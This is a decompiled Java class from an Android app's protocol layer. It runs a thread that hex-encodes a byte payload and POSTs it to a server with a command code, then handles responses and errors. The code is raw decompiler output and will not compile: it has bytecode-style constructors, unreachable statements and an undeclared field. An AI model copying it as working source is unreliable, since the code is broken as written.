package com.vvt.phoenix.prot.c;

import android.os.ConditionVariable;
import android.os.Looper;
import com.vvt.http.d;
import com.vvt.http.request.ContentType;
import com.vvt.http.request.MethodType;
import java.io.ByteArrayOutputStream;

class f
  extends Thread
  implements d
{
  private int b;
  
  public f(e parame, int paramInt)
  {
    this.b = paramInt;
  }
  
  public void a(int paramInt, Exception paramException)
  {
    e.a(this.a, false);
    e locale = this.a;
    Object[] arrayOfObject = new Object[2];
    Integer localInteger = Integer.valueOf(paramInt);
    arrayOfObject[0] = localInteger;
    String str1 = paramException.getMessage();
    arrayOfObject[1] = str1;
    String str2 = String.format("HTTP Code %d, Error Message: %s", arrayOfObject);
    e.a(locale, str2);
    e.g(this.a).open();
    Looper.myLooper().quit();
  }
  
  public void a(com.vvt.http.a.a parama)
  {
    Object localObject1 = parama.a().d();
    Object localObject2 = parama.b();
    if (localObject1 != localObject2)
    {
      e.a(this.a, false);
      localObject1 = this.a;
      localObject2 = "Response MIME type doesn't matched with the request";
      e.a((e)localObject1, (String)localObject2);
      e.g(this.a).open();
      localObject1 = Looper.myLooper();
      ((Looper)localObject1).quit();
    }
    for (;;)
    {
      return;
      localObject1 = parama.d();
      localObject2 = e.h(this.a);
      int i = localObject1.length;
      ((ByteArrayOutputStream)localObject2).write((byte[])localObject1, 0, i);
    }
  }
  
  public void a(com.vvt.http.a.b paramb) {}
  
  public void a(Exception paramException)
  {
    e.a(this.a, false);
    e locale = this.a;
    String str = paramException.getMessage();
    e.a(locale, str);
    e.g(this.a).open();
    Looper.myLooper().quit();
  }
  
  public void b(com.vvt.http.a.a parama)
  {
    e.a(this.a, true);
    e.g(this.a).open();
    Looper.myLooper().quit();
  }
  
  public void b(Exception paramException)
  {
    e.a(this.a, false);
    e locale = this.a;
    String str = paramException.getMessage();
    e.a(locale, str);
    e.g(this.a).open();
    Looper.myLooper().quit();
  }
  
  public void run()
  {
    com.vvt.http.request.b localb = null;
    Looper.prepare();
    Object localObject1 = "";
    Object localObject2 = "";
    Object localObject3 = e.a(this.a);
    if (localObject3 != null)
    {
      localObject1 = Integer.toString(e.a(this.a).length);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject4 = e.a(this.a);
      int i = localObject4.length;
      int j = 0;
      localObject2 = null;
      while (j < i)
      {
        byte b1 = localObject4[j];
        String str = "%02x";
        int k = 1;
        Object[] arrayOfObject = new Object[k];
        Object localObject5 = Byte.valueOf(b1);
        arrayOfObject[0] = localObject5;
        localObject5 = String.format(str, arrayOfObject);
        ((StringBuilder)localObject3).append((String)localObject5);
        j += 1;
      }
      localObject2 = ((StringBuilder)localObject3).toString();
    }
    localb = new com/vvt/http/request/b;
    localb.<init>();
    localObject3 = e.a(this.a);
    localb.a((byte[])localObject3);
    localb.a(120000);
    localObject3 = ContentType.BINARY_OCTET_STREAM;
    localb.a((ContentType)localObject3);
    localObject3 = MethodType.POST;
    localb.a((MethodType)localObject3);
    localObject3 = e.b(this.a);
    localb.b((String)localObject3);
    localObject3 = e.c(this.a);
    localb.c((String)localObject3);
    localObject3 = e.d(this.a);
    localb.d((String)localObject3);
    localObject3 = e.e(this.a);
    localb.e((String)localObject3);
    Object localObject4 = Integer.toString(this.b);
    localb.a("commandCode", (String)localObject4);
    localb.a("payloadLength", (String)localObject1);
    localb.a("payload", (String)localObject2);
    localObject2 = this.a;
    localObject1 = new java/io/ByteArrayOutputStream;
    ((ByteArrayOutputStream)localObject1).<init>();
    e.a((e)localObject2, (ByteArrayOutputStream)localObject1);
    e.f(this.a).a(localb, this);
    Looper.loop();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/MyUncaughtExceptionHandler/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */